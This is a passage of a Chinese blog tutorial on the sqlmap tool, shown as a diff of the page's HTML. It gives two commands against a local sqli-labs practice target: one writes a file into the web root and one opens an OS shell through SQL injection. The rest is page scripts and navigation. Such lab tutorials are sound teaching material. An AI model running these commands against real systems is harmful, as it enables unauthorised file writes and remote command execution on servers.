+<p><strong>2.写入文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"></span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" rel="tag">-SQL注入 -工具使用</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            GraphQL之内省
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">OGNL表达式</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
